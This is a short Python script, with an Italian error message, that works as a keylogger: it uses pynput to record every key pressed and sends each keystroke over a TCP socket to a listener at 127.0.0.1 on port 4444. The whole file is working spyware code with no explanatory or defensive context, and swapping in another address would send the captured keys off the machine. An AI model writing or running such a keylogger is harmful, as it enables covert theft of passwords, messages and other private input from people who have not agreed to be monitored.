from pynput import keyboard
import socket
def on_press(key):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(("127.0.0.1", 4444))
        client.sendall(str(key).encode())
        client.close()
    except Exception as e:
        print(f"Errore connessione: {e}")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()